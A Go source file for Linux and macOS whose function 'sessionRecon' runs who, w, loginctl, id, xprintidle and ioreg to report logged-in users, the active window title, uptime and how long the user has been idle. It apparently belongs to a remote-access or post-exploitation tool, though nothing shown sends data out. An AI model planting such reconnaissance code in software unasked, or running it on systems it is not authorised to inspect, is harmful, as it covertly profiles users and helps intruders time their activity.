//go:build linux || darwin
// +build linux darwin

package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func sessionRecon() (string, error) {
	var sb strings.Builder
	fmt.Fprintf(&sb, "=== session recon (%s) ===\n", runtime.GOOS)
	fmt.Fprintf(&sb, "active_window=%s\n", getActiveWindowTitle())
	if u := os.Getenv("USER"); u != "" {
		fmt.Fprintf(&sb, "USER=%s\n", u)
	}
	if d := os.Getenv("DISPLAY"); d != "" {
		fmt.Fprintf(&sb, "DISPLAY=%s\n", d)
	}
	if runtime.GOOS == "linux" {
		if b, err := os.ReadFile("/proc/uptime"); err == nil {
			fmt.Fprintf(&sb, "uptime_fields=%s", string(b))
		}
	}

	cmds := [][]string{
		{"who"},
		{"w", "-h"},
		{"loginctl", "list-sessions", "--no-legend"},
		{"id"},
	}
	if runtime.GOOS == "linux" {
		cmds = append(cmds, []string{"loginctl", "show-session", os.Getenv("XDG_SESSION_ID")})
		cmds = append(cmds, []string{"xprintidle"})
	}
	if runtime.GOOS == "darwin" {
		cmds = append(cmds, []string{"ioreg", "-c", "IOHIDSystem", "-d", "4"})
	}
	for _, args := range cmds {
		if args[0] == "loginctl" && args[len(args)-1] == "" {
			continue
		}
		cmd := exec.Command(args[0], args[1:]...)
		out, err := cmd.CombinedOutput()
		fmt.Fprintf(&sb, "\n--- %s ---\n", strings.Join(args, " "))
		if len(out) > 0 {
			trimmed := string(out)
			if len(trimmed) > 4000 {
				trimmed = trimmed[:4000] + "\n(truncated)\n"
			}
			sb.WriteString(trimmed)
			if !strings.HasSuffix(trimmed, "\n") {
				sb.WriteByte('\n')
			}
		}
		if err != nil && len(out) == 0 {
			fmt.Fprintf(&sb, "(not available: %v)\n", err)
		}
	}
	return sb.String(), nil
}
